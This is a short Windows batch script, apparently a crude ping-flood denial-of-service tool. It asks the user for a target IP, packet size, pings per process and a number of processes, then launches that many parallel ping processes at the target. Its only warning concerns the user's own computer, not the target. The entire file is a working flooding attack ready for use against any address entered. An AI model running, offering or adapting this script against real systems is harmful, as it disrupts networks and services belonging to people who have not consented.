@echo off

set /p numAttack="Pings per process: "
set /p numProcess="Number of ping processes: "
set /p sizeByte="Bytes per ping: "
set /p target="Target IP: "
set /p warn="WARNING: This will take an inordinate amount of resources, rendering your computer unusable under certain conditions."

pause

for /L %%n in (1,1,%numProcess%) do (
	START ping -n %numAttack% -l %sizeByte% %target%
)

pause